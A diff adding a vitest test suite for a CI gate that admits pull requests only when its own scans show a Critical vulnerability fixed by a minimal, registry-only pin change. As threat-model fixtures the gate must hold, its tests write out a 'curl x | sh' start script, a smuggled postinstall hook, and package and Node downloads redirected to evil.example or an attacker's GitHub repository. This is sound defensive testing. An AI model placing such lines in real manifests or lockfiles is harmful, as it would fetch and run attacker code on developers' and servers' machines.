@@ -1,0 +1,577 @@
+import { describe, expect, it } from 'vitest';
+import { parse } from 'yaml';
+import { ENQUEUES } from '../policy/line.ts';
+import {
+  APP_GATES,
+  atOrAbove,
+  type CriticalFixIO,
+  criticalFix,
+  type Finding,
+  gatesPass,
+  lockMoves,
+  type Scan,
+  scansShow,
+  splitKey,
+} from './critical-fix.ts';
+import { scanOf } from './critical-fix-readers.ts';
+import type { Run } from './pin-move-ran.ts';
+
+/**
+ * A Critical fix (ADR 0020) is proved from the pull request's two commits by the gate's own scans. Each case is a
+ * change against the app's pins as they are at the base, read by a fake scanner whose advisories the case names: the
+ * passing ones, and each way the threat model says a change could try to pass without being one, held for Martin.
+ */
+
+const HEAD = 'a'.repeat(40);
+const D = (c: string) => `sha256:${c.repeat(64)}`;
+const BUILD = `node:24.22.1-alpine3.24@${D('1')}`;
+const RUNTIME = `gcr.io/distroless/nodejs24-debian13:nonroot@${D('2')}`;
+
+const LOCK = `lockfileVersion: '9.0'
+
+settings:
+  autoInstallPeers: true
+
+importers:
+
+  .:
+    dependencies:
+      pino:
+        specifier: ^10.4.0
+        version: 10.4.0
+      protobufjs:
+        specifier: ^7.6.4
+        version: 7.6.4
+
+packages:
+
+  long@5.3.2:
+    resolution: {integrity: sha512-long}
+
+  pino@10.4.0:
+    resolution: {integrity: sha512-pino}
+
+  protobufjs@7.6.4:
+    resolution: {integrity: sha512-p764}
+
+snapshots:
+
+  long@5.3.2: {}
+
+  pino@10.4.0: {}
+
+  protobufjs@7.6.4:
+    dependencies:
+      long: 5.3.2
+`;
+
+/** The fix: protobufjs to 7.6.6, which requires a package it did not before, and long as it was. */
+const FIXED_LOCK = LOCK.replace(
+  'specifier: ^7.6.4\n        version: 7.6.4',
+  'specifier: ^7.6.6\n        version: 7.6.6',
+)
+  .replace(
+    '  protobufjs@7.6.4:\n    resolution: {integrity: sha512-p764}',
+    "  '@protobufjs/base64@1.1.2':\n    resolution: {integrity: sha512-b64}\n\n  protobufjs@7.6.6:\n    resolution: {integrity: sha512-p766}",
+  )
+  .replace(
+    '  protobufjs@7.6.4:\n    dependencies:\n      long: 5.3.2',
+    "  '@protobufjs/base64@1.1.2': {}\n\n  protobufjs@7.6.6:\n    dependencies:\n      '@protobufjs/base64': 1.1.2\n      long: 5.3.2",
+  );
+
+const MANIFEST = `{
+  "name": "shop",
+  "packageManager": "pnpm@12.16.1",
+  "engines": {
+    "node": ">=24.21.0"
+  },
+  "scripts": {
+    "start": "node src/server.ts"
+  },
+  "dependencies": {
+    "pino": "^10.4.0",
+    "protobufjs": "^7.6.4"
+  }
+}
+`;
+const FIXED_MANIFEST = MANIFEST.replace('"protobufjs": "^7.6.4"', '"protobufjs": "^7.6.6"');
+
+const DOCKERFILE = `# The shop's image.
+FROM ${BUILD} AS build
+RUN corepack enable
+FROM ${RUNTIME}
+CMD ["src/server.ts"]
+`;
+const MISE = `[settings]
+lockfile = true
+
+[tools]
+# Exact: the Node both of the Dockerfile's stages run.
+node = "24.22.1"
+pnpm = "12"
+`;
+const MISE_LOCK = `[[tools.node]]
+version = "24.22.1"
+backend = "core:node"
+specifiers = ["24.22.1"]
+
+[tools.node."platforms.linux-x64"]
+checksum = "sha256:${'c'.repeat(64)}"
+url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-linux-x64.tar.gz"
+
+[tools.node."platforms.macos-arm64"]
+checksum = "sha256:${'d'.repeat(64)}"
+url = "https://nodejs.org/dist/v24.22.1/node-v24.22.1-darwin-arm64.tar.gz"
+
+[[tools.pnpm]]
+version = "12.16.1"
+`;
+const BASE: Record<string, string> = {
+  'pnpm-lock.yaml': LOCK,
+  'package.json': MANIFEST,
+  Dockerfile: DOCKERFILE,
+  'mise.toml': MISE,
+  'mise.lock': MISE_LOCK,
+};
+
+/** Node 24.22.1 to 24.22.2, in mise, its lock and both images. */
+const NODE_MOVE = {
+  'mise.toml': MISE.replace('node = "24.22.1"', 'node = "24.22.2"'),
+  'mise.lock': MISE_LOCK.replaceAll('24.22.1', '24.22.2')
+    .replace('c'.repeat(64), 'e'.repeat(64))
+    .replace('d'.repeat(64), 'f'.repeat(64)),
+  Dockerfile: DOCKERFILE.replace(BUILD, `node:24.22.2-alpine3.24@${D('3')}`).replace(
+    RUNTIME,
+    RUNTIME.replace(D('2'), D('4')),
+  ),
+};
+
+/** The scanner's advisories, by `name@version`: each version below a fix has the finding. */
+const ADVISORIES: Record<string, Finding[]> = {
+  'protobufjs@7.6.4': [{ id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'CRITICAL' }],
+  'pino@10.4.0': [{ id: 'CVE-2026-9', pkg: 'pino', version: '10.4.0', fixed: '10.4.1', severity: 'MEDIUM' }],
+};
+
+/** A fake Trivy: the lockfile's packages, as it lists them, and each one's advisories. */
+function scanLockfile(text: string, advisories: Record<string, Finding[]>): Scan {
+  const packages = Object.keys((parse(text) as { packages?: Record<string, unknown> }).packages ?? {}).flatMap(
+    (key) => {
+      const split = splitKey(key);
+      return split ? [split] : [];
+    },
+  );
+  return {
+    packages,
+    findings: packages.flatMap(({ name, version }) => advisories[`${name}@${version}`] ?? []),
+  };
+}
+
+/** Every one of the app's gates, run at the head by GitHub Actions in its own workflow for the pull request. */
+const passedGates = (over: Partial<Run> = {}): Run[] =>
+  Object.entries(APP_GATES).map(([name, workflow], i) => ({
+    id: 100 + i,
+    name,
+    head_sha: HEAD,
+    status: 'completed',
+    conclusion: 'success',
+    app: { slug: 'github-actions' },
+    check_suite: { id: 10 + i },
+    workflow,
+    ...over,
+  }));
+
+const image = (packages: Scan['packages'], findings: Finding[] = [], node?: string): Scan => ({
+  packages,
+  findings,
+  ...(node ? { node } : {}),
+});
+const OS = [{ name: 'libc6', version: '2.41-12' }];
+
+interface Fakes {
+  advisories?: Record<string, Finding[]>;
+  images?: Record<string, Scan>;
+  node?: Record<string, Finding[]>;
+  tags?: Record<string, string[]>;
+  digests?: Record<string, string>;
+  runs?: Run[];
+  modes?: Record<string, string>;
+  status?: Record<string, string>;
+}
+
+/** The change, file by file, against BASE, and the fakes it is read with. */
+function io(change: Record<string, string>, fakes: Fakes = {}): CriticalFixIO {
+  const files = Object.entries(change).map(([path, after]) => ({ path, before: BASE[path] ?? '', after }));
+  const raw = files
+    .map(
+      ({ path }) =>
+        `:${fakes.modes?.[path] ?? '100644 100644'} 1111111 2222222 ${fakes.status?.[path] ?? 'M'}\t${path}`,
+    )
+    .join('\n');
+  return {
+    diff: async () => ({ raw, files }),
+    lockfile: async (text) => scanLockfile(text, fakes.advisories ?? ADVISORIES),
+    image: async (reference) => {
+      const scan = fakes.images?.[reference];
+      if (!scan) throw new Error(`no such image: ${reference}`);
+      return scan;
+    },
+    node: async (version) => fakes.node?.[version] ?? [],
+    tags: async (repository) => fakes.tags?.[repository] ?? [],
+    digest: async (reference) => {
+      const digest = fakes.digests?.[reference];
+      if (!digest) throw new Error(`no such tag: ${reference}`);
+      return digest;
+    },
+    runs: async () => fakes.runs ?? passedGates(),
+  };
+}
+
+const PACKAGE_FIX = { 'pnpm-lock.yaml': FIXED_LOCK, 'package.json': FIXED_MANIFEST };
+
+/** A Node move, with the images it moves to and Node's own advisories. */
+const nodeFakes = (over: Fakes = {}): Fakes => ({
+  images: {
+    [BUILD]: image(OS, [], '24.22.1'),
+    [`node:24.22.2-alpine3.24@${D('3')}`]: image(OS, [], '24.22.2'),
+    [RUNTIME]: image(OS),
+    [RUNTIME.replace(D('2'), D('4'))]: image(OS),
+  },
+  node: {
+    '24.22.1': [{ id: 'CVE-2026-50', pkg: 'node', version: '24.22.1', fixed: '^24.22.2', severity: 'CRITICAL' }],
+  },
+  tags: { node: ['24.22.1-alpine3.24', '24.22.2-alpine3.24', '25.0.0-alpine3.24'] },
+  digests: {
+    'node:24.22.2-alpine3.24': D('3'),
+    'gcr.io/distroless/nodejs24-debian13:nonroot': D('4'),
+  },
+  ...over,
+});
+
+const held = async (change: Record<string, string>, fakes: Fakes = {}) => {
+  const said = await criticalFix(io(change, fakes), HEAD);
+  if (!('reason' in said)) throw new Error(`passed: ${said.title}`);
+  return said.reason;
+};
+
+describe('a Critical fix: what passes', () => {
+  it('passes a package moved to fix a Critical, with the package its new version requires', async () => {
+    const said = await criticalFix(io(PACKAGE_FIX), HEAD);
+    expect(said).toMatchObject({ fixed: { pkg: 'protobufjs', ids: ['CVE-2026-1'], where: ['pnpm-lock.yaml'] } });
+    expect('title' in said && said.title).toBe(
+      "A Critical vulnerability's fix: protobufjs's CVE-2026-1 gone from pnpm-lock.yaml, at or above its fix, nothing new at High, every gate passed",
+    );
+    // The lockfile alone, with no range moved in package.json, passes too.
+    expect(await criticalFix(io({ 'pnpm-lock.yaml': FIXED_LOCK.replace('^7.6.6', '^7.6.4') }), HEAD)).toHaveProperty(
+      'title',
+    );
+  });
+
+  it("passes Node moved in mise, its lock and every FROM, to fix a Critical Node's own database names", async () => {
+    const said = await criticalFix(io(NODE_MOVE, nodeFakes()), HEAD);
+    expect(said).toMatchObject({ fixed: { pkg: 'node', ids: ['CVE-2026-50'], where: ['Node'] } });
+  });
+
+  it('is queued by the line at Guarded and Lights-out, never at Supervised', () => {
+    expect(ENQUEUES.supervised).not.toContain('critical-fix');
+    expect(ENQUEUES.guarded).toContain('critical-fix');
+    expect(ENQUEUES['lights-out']).toContain('critical-fix');
+  });
+});
+
+describe("a Critical fix: the plan's five, each held for Martin", () => {
+  it('holds a change that claims a fix its scans do not show', async () => {
+    const still = {
+      ...ADVISORIES,
+      'protobufjs@7.6.6': [{ ...((ADVISORIES['protobufjs@7.6.4'] as Finding[])[0] as Finding), version: '7.6.6' }],
+    };
+    expect(await held(PACKAGE_FIX, { advisories: still })).toMatch(/^the scans show no Critical fixed/);
+    // Nor one whose finding goes while its package is not at or above the advisory's fixed version.
+    const early = {
+      ...ADVISORIES,
+      'protobufjs@7.6.4': [{ ...((ADVISORIES['protobufjs@7.6.4'] as Finding[])[0] as Finding), fixed: '7.6.9' }],
+    };
+    expect(await held(PACKAGE_FIX, { advisories: early })).toMatch(
+      /protobufjs is at 7\.6\.6 .* not at or above 7\.6\.9/,
+    );
+  });
+
+  it('holds a fix that also changes code, or anything that is not a pin', async () => {
+    for (const path of [
+      'src/server.ts',
+      'scripts/seed.ts',
+      '.github/workflows/check.yml',
+      'pnpm-workspace.yaml',
+      '.npmrc',
+      'packages/x/package.json',
+    ])
+      expect(await held({ ...PACKAGE_FIX, [path]: 'x' })).toMatch(/^pins only: it changes .*not one of the app's pins/);
+  });
+
+  it('holds a finding gone because its package was removed, renamed or aliased, or the runtime image swapped', async () => {
+    const removed = LOCK.replace(/\n {6}protobufjs:\n {8}specifier: \^7\.6\.4\n {8}version: 7\.6\.4/, '')
+      .replace('  protobufjs@7.6.4:\n    resolution: {integrity: sha512-p764}\n\n', '')
+      .replace('  protobufjs@7.6.4:\n    dependencies:\n      long: 5.3.2\n', '');
+    expect(await held({ 'pnpm-lock.yaml': removed })).toMatch(/importer|protobufjs is gone/);
+    const renamed = LOCK.replaceAll('protobufjs', 'protobufjs-fixed');
+    expect(await held({ 'pnpm-lock.yaml': renamed })).toMatch(/^pins only:/);
+    const aliased = FIXED_LOCK.replace('version: 7.6.6', 'version: protobufjs-fork@7.6.6');
+    expect(await held({ 'pnpm-lock.yaml': aliased })).toMatch(/not a registry's version \(an alias/);
+    const swapped = DOCKERFILE.replace(RUNTIME, `gcr.io/distroless/static-debian13:nonroot@${D('5')}`);
+    expect(await held({ Dockerfile: swapped })).toMatch(
+      /swaps gcr\.io\/distroless\/nodejs24-debian13 for another image/,
+    );
+    // And a scan that no longer lists a package the base's did, however the lockfile reads.
+    const quiet = { ...PACKAGE_FIX };
+    const fakes = io(quiet);
+    const scan = fakes.lockfile;
+    fakes.lockfile = async (text) => {
+      const read = await scan(text);
+      return text === FIXED_LOCK ? { ...read, packages: read.packages.filter((p) => p.name !== 'long') } : read;
+    };
+    expect(await criticalFix(fakes, HEAD)).toMatchObject({
+      reason: expect.stringMatching(/long is in the base's scan/),
+    });
+  });
+
+  it('holds a Critical fix bundled with an unrelated bump', async () => {
+    const bundled = FIXED_LOCK.replace(
+      'specifier: ^10.4.0\n        version: 10.4.0',
+      'specifier: ^10.4.1\n        version: 10.4.1',
+    )
+      .replace(
+        '  pino@10.4.0:\n    resolution: {integrity: sha512-pino}',
+        '  pino@10.4.1:\n    resolution: {integrity: sha512-pin1}',
+      )
+      .replace('  pino@10.4.0: {}', '  pino@10.4.1: {}');
+    const manifest = FIXED_MANIFEST.replace('"pino": "^10.4.0"', '"pino": "^10.4.1"');
+    expect(await held({ 'pnpm-lock.yaml': bundled, 'package.json': manifest })).toMatch(
+      /^only what the fix needs: it moves pino to 10\.4\.1 too/,
+    );
+    // Within the lockfile alone too, and a package added that the new version does not require.
+    const extra = FIXED_LOCK.replace(
+      '  long@5.3.2:\n',
+      '  left-pad@1.3.0:\n    resolution: {integrity: sha512-lp}\n\n  long@5.3.2:\n',
+    );
+    expect(await held({ 'pnpm-lock.yaml': extra })).toMatch(/it adds left-pad 1\.3\.0/);
+    // And a group: two packages' Criticals fixed at once.
+    const both = {
+      ...ADVISORIES,
+      'pino@10.4.0': [{ id: 'CVE-2026-8', pkg: 'pino', version: '10.4.0', fixed: '10.4.1', severity: 'CRITICAL' }],
+    };
+    expect(await held({ 'pnpm-lock.yaml': bundled, 'package.json': manifest }, { advisories: both })).toMatch(
+      /a group/,
+    );
+  });
+
+  it('holds a fix rated Critical by its publisher and High by the scanner: the scanner’s rating alone releases one', async () => {
+    const high = {
+      'protobufjs@7.6.4': [{ id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'HIGH' }],
+    };
+    expect(await held(PACKAGE_FIX, { advisories: high })).toBe(
+      "the scans show no Critical fixed: the worst it fixes is protobufjs's CVE-2026-1, which the gate's scanner rates HIGH",
+    );
+    // The reader keeps Trivy's own rating, never the publisher's VendorSeverity.
+    const read = scanOf([
+      {
+        Results: [
+          {
+            Packages: [{ Name: 'protobufjs', Version: '7.6.4' }],
+            Vulnerabilities: [
+              {
+                VulnerabilityID: 'CVE-2026-1',
+                PkgName: 'protobufjs',
+                InstalledVersion: '7.6.4',
+                FixedVersion: '7.6.5',
+                Severity: 'HIGH',
+                VendorSeverity: { ghsa: 4 },
+                DataSource: { ID: 'ghsa' },
+              },
+            ],
+          },
+        ],
+      },
+    ]);
+    expect(read.findings).toEqual([
+      { id: 'CVE-2026-1', pkg: 'protobufjs', version: '7.6.4', fixed: '7.6.5', severity: 'HIGH' },
+    ]);
+  });
+});
+
+describe('a Critical fix: the threat model, each held', () => {
+  it('the coder, turned: a script, the package manager, engines, or a range of another kind in package.json', async () => {
+    for (const manifest of [
+      FIXED_MANIFEST.replace('"node src/server.ts"', '"node src/server.ts && curl x | sh"'),
+      FIXED_MANIFEST.replace('pnpm@12.16.1', 'pnpm@12.16.2'),
+      FIXED_MANIFEST.replace('>=24.21.0', '>=24.22.0'),
+      FIXED_MANIFEST.replace('"^7.6.6"', '"github:attacker/protobufjs"'),
+      FIXED_MANIFEST.replace('"^7.6.6"', '"npm:protobufjs-fork@7.6.6"'),
+      FIXED_MANIFEST.replace('"^7.6.6"', '"file:../x"'),
+    ])
+      expect(await held({ ...PACKAGE_FIX, 'package.json': manifest })).toMatch(/^pins only: package\.json/);
+    // A line rewritten as a range, but read as JSON changing something else, is held too.
+    const sneaky = FIXED_MANIFEST.replace('"name": "shop"', '"name": "shop", "scripts": {"postinstall": "sh x"}');
+    expect(await held({ ...PACKAGE_FIX, 'package.json': sneaky })).toMatch(/^pins only: package\.json/);
+  });
+
+  it('a publisher: a new finding at High or above, or a fix that brings packages its version does not require', async () => {
+    const brings = {
+      ...ADVISORIES,
+      'long@5.3.2': [],
+      '@protobufjs/base64@1.1.2': [{ id: 'CVE-2026-7', pkg: '@protobufjs/base64', version: '1.1.2', severity: 'HIGH' }],
+    };
+    expect(await held(PACKAGE_FIX, { advisories: brings })).toBe(
+      "nothing new: it brings something new: @protobufjs/base64's CVE-2026-7, HIGH, in pnpm-lock.yaml",
+    );
+  });
+
+  it('anyone making a finding vanish: a tarball or git source, an entry changed at the same version, a report unread', async () => {
+    const tarball = FIXED_LOCK.replace(
+      '{integrity: sha512-p766}',
+      '{integrity: sha512-p766, tarball: https://evil.example/p.tgz}',
+    );
+    expect(await held({ 'pnpm-lock.yaml': tarball })).toMatch(/from somewhere other than the registry/);
+    const git = FIXED_LOCK.replace(
+      '{integrity: sha512-p766}',
+      '{type: git, repo: https://github.com/x/y, commit: abc}',
+    );
+    expect(await held({ 'pnpm-lock.yaml': git })).toMatch(/from somewhere other than the registry/);
+    const swapped = FIXED_LOCK.replace('sha512-long', 'sha512-other');
+    expect(await held({ 'pnpm-lock.yaml': swapped })).toMatch(/changes long@5\.3\.2's entry at the same version/);
+    const keyed = FIXED_LOCK.replace(
+      '  protobufjs@7.6.6:\n    resolution',
+      '  protobufjs@https://evil.example/p.tgz:\n    resolution',
+    );
+    expect(await held({ 'pnpm-lock.yaml': keyed })).toMatch(/no registry's version|not a registry's/);
+    const notYaml = `${FIXED_LOCK}\n  protobufjs@7.6.6:\n    resolution: {integrity: sha512-dup}\n`;
+    expect(await held({ 'pnpm-lock.yaml': notYaml })).toMatch(/not YAML the gate reads/);
+    // A scan that cannot read the head's lockfile throws, and the job holds it saying what it could not read.
+    const unread = io(PACKAGE_FIX);
+    unread.lockfile = async () => {
+      throw new Error('Trivy read no packages from it');
+    };
+    await expect(criticalFix(unread, HEAD)).rejects.toThrow('Trivy read no packages');
+    // Lockfile settings, overrides and documents are not pins.
+    expect(
+      await held({ 'pnpm-lock.yaml': FIXED_LOCK.replace('autoInstallPeers: true', 'autoInstallPeers: false') }),
+    ).toMatch(/changes its settings/);
+    expect(
+      await held({ 'pnpm-lock.yaml': FIXED_LOCK.replace('settings:', 'overrides:\n  long: 5.3.3\n\nsettings:') }),
+    ).toMatch(/other sections/);
+    expect(await held({ 'pnpm-lock.yaml': `---\nlockfileVersion: '9.0'\n---\n${FIXED_LOCK}` })).toMatch(/documents/);
+    // A package that goes back, or across a major.
+    const back = LOCK.replace('version: 10.4.0', 'version: 10.3.0')
+      .replace('pino@10.4.0:\n    resolution', 'pino@10.3.0:\n    resolution')
+      .replace('pino@10.4.0: {}', 'pino@10.3.0: {}');
+    expect(await held({ 'pnpm-lock.yaml': back })).toMatch(
+      /pino 10\.4\.0 goes, with nothing forward of it on its major/,
+    );
+  });
+
+  it('anyone making Node vanish: an image that named its Node at the base and does not at the head', async () => {
+    const fakes = nodeFakes();
+    (fakes.images as Record<string, Scan>)[`node:24.22.2-alpine3.24@${D('3')}`] = image(OS);
+    expect(await held(NODE_MOVE, fakes)).toMatch(/names no Node at the head/);
+  });
+
+  it('anyone who can write a check: another app’s run, another workflow’s, another head’s, or one not a success', async () => {
+    const name = 'gates / lockfile scan';
+    const without = passedGates().filter((r) => r.name !== name);
+    const one = passedGates().find((r) => r.name === name) as Run;
+    for (const [run, why] of [
+      [{ ...one, app: { slug: 'mrogan-software-factory' } }, 'has not run'],
+      [{ ...one, workflow: '.github/workflows/other.yml' }, 'ran in no run of .github/workflows/gates.yml'],
+      [{ ...one, workflow: null }, 'ran in no run of'],
+      [{ ...one, head_sha: 'b'.repeat(40) }, 'has not run'],
+      [{ ...one, conclusion: 'skipped' }, 'is skipped, not a success'],
+      [{ ...one, conclusion: 'failure' }, 'is failure, not a success'],
+      [{ ...one, status: 'in_progress', conclusion: null }, 'has not finished'],
+    ] as const) {
+      expect(await held(PACKAGE_FIX, { runs: [...without, run as Run] })).toContain(`every gate passes: ${name}`);
+      expect(gatesPass([...without, run as Run], HEAD)).toContain(why);
+    }
+    // A newer attempt that succeeded counts; a second run that succeeded never hides one that failed.
+    expect(gatesPass([...without, { ...one, conclusion: 'failure' }, { ...one, id: 999 }], HEAD)).toBeUndefined();
+    expect(
+      gatesPass([...without, { ...one, conclusion: 'failure' }, { ...one, id: 999, check_suite: { id: 77 } }], HEAD),
+    ).toContain('failure');
+  });
+
+  it('the same through an image: a digest not its tag’s, a move back or across a major, a FROM it cannot read', async () => {
+    const notTags = nodeFakes({
+      digests: { 'node:24.22.2-alpine3.24': D('9'), 'gcr.io/distroless/nodejs24-debian13:nonroot': D('4') },
+    });
+    expect(await held(NODE_MOVE, notTags)).toMatch(/^forward on its line: a digest that is not the tag's/);
+    const back = { ...NODE_MOVE, Dockerfile: NODE_MOVE.Dockerfile.replace('24.22.2-alpine3.24', '24.22.0-alpine3.24') };
+    expect(await held(back, nodeFakes())).toMatch(/^forward on its line: a move backwards/);
+    const major = { ...NODE_MOVE, Dockerfile: NODE_MOVE.Dockerfile.replace('24.22.2-alpine3.24', '25.0.0-alpine3.24') };
+    expect(await held(major, nodeFakes())).toMatch(/^forward on its line: a major/);
+    for (const line of [
+      `FROM --platform=linux/amd64 ${BUILD} AS build`,
+      'FROM node:24.22.2-alpine3.24 AS build',
+      `FROM ${BUILD} AS builder`,
+    ])
+      expect(await held({ Dockerfile: DOCKERFILE.replace(`FROM ${BUILD} AS build`, line) })).toMatch(
+        /^pins only: Dockerfile/,
+      );
+  });
+
+  it('Node: mise and its lock together, forward on its major, and every image on the Node mise pins', async () => {
+    expect(await held({ 'mise.toml': NODE_MOVE['mise.toml'] })).toMatch(/do not move Node together/);
+    expect(
+      await held({ ...NODE_MOVE, 'mise.lock': NODE_MOVE['mise.lock'].replace('dist/v24.22.2/', 'dist/v24.22.3/') }),
+    ).toMatch(/^pins only: mise\.lock/);
+    expect(
+      await held({ ...NODE_MOVE, 'mise.lock': NODE_MOVE['mise.lock'].replace('nodejs.org', 'evil.example') }),
+    ).toMatch(/^pins only: mise\.lock/);
+    expect(
+      await held({ ...NODE_MOVE, 'mise.toml': NODE_MOVE['mise.toml'].replace('pnpm = "12"', 'pnpm = "13"') }),
+    ).toMatch(/^pins only: mise\.toml/);
+    const backward = {
+      'mise.toml': MISE.replace('24.22.1', '24.22.0'),
+      'mise.lock': MISE_LOCK.replaceAll('24.22.1', '24.22.0'),
+    };
+    expect(await held(backward)).toMatch(/not forward on its major/);
+    // An image left behind, or one that runs another Node than mise pins.
+    const oneFrom = { ...NODE_MOVE, Dockerfile: DOCKERFILE.replace(BUILD, `node:24.22.2-alpine3.24@${D('3')}`) };
+    expect(await held(oneFrom, nodeFakes())).toMatch(/moves 1 of the Dockerfile's 2 FROM lines/);
+    const other = nodeFakes();
+    (other.images as Record<string, Scan>)[RUNTIME.replace(D('2'), D('4'))] = image(OS, [], '24.21.0');
+    expect(await held(NODE_MOVE, other)).toMatch(/runs Node 24\.21\.0 at the head, and mise pins 24\.22\.2/);
+  });
+
+  it('a package fix that moves an image or Node too, and an image fix that moves a package', async () => {
+    const fakes = nodeFakes({ node: {} });
+    expect(await held({ ...PACKAGE_FIX, ...NODE_MOVE }, fakes)).toMatch(/moves an image or Node too/);
+  });
+});
+
+describe('the pieces', () => {
+  it('reads a fixed version as the scanner writes one', () => {
+    expect(atOrAbove('7.6.6', '7.6.5')).toBe(true);
+    expect(atOrAbove('7.6.4', '7.6.5')).toBe(false);
+    expect(atOrAbove('1.2.9', '1.2.8, 2.0.1')).toBe(true);
+    expect(atOrAbove('2.0.0', '1.2.8, 2.0.1')).toBe(false);
+    expect(atOrAbove('24.22.2', '^24.22.2 || ^22.20.1')).toBe(true);
+    expect(atOrAbove('1.0.0', 'none')).toBeUndefined();
+  });
+
+  it('holds a finding fixed nowhere, and a finding that is not Critical', () => {
+    const was: Scan = { packages: [{ name: 'a', version: '1.0.0' }], findings: [] };
+    expect(scansShow([{ label: 'x', was, now: was }])).toMatchObject({
+      reason: expect.stringMatching(/no Critical fixed/),
+    });
+  });
+
+  it('reads the lockfile’s moves, each version forward, and what each new version requires', () => {
+    const moves = lockMoves(LOCK, FIXED_LOCK);
+    expect(moves).toMatchObject({
+      moved: new Map([['protobufjs', { removed: ['7.6.4'], added: ['7.6.6'] }]]),
+      added: new Map([['@protobufjs/base64', ['1.1.2']]]),
+      ranges: new Map([['protobufjs', { from: '^7.6.4', to: '^7.6.6' }]]),
+    });
+    expect('requires' in moves && moves.requires.get('protobufjs@7.6.6')).toEqual([
+      '@protobufjs/base64@1.1.2',
+      'long@5.3.2',
+    ]);
+  });
+});
